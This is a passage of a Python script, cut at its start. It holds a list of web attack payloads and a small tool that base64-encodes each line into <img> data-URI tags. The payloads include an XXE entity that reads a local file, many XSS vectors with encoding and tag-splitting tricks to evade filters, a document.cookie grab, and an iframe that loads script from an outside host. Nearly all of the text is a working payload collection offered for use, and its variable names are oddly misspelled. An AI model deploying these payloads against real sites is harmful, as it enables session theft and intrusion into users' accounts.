<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
<script>alert('XSS')</script>
%3cscript%3ealert('XSS')%3c/script%3e
%22%3e%3cscript%3ealert('XSS')%3c/script%3e
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert('XSS')>       
<img src=xss onerror=alert(1)>

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC="jav ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
<<SCRIPT>alert("XSS");//<</SCRIPT>
%253cscript%253ealert(1)%253c/script%253e
"><s"%2b"cript>alert(document.cookie)</script>
foo<script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<marquee onstart='javascript:alert('1');'>=(◕_◕)="""
    return data.splitlines()

def main():
    parser = argparse.ArgumentParser(description='Text to Base64')
    parser.add_argument('-f', '--file', help='Path to the file')
    parser.add_argument('-o', '--output', help='Path to save the file')
    args = parser.parse_args()

    if args.file:
        linns = rrdd_fil(args.file)
    else:
        linns = rrdde_txxt()

    if linns:
        gtout = []
        for liinn in linns:
            data64 = base64.b64encode(liinn.encode('utf-8')).decode('utf-8')
            gtout.append(f'<img src="data:image/png;base64,{data64}" />')

        if args.output:
            with open(args.output, 'w') as fill_outt:
                fill_outt.write('\n'.join(gtout))
            print(f"Saved to {args.output}")
        else:
            print('\n'.join(gtout))

if __name__ == "__main__":
    main()
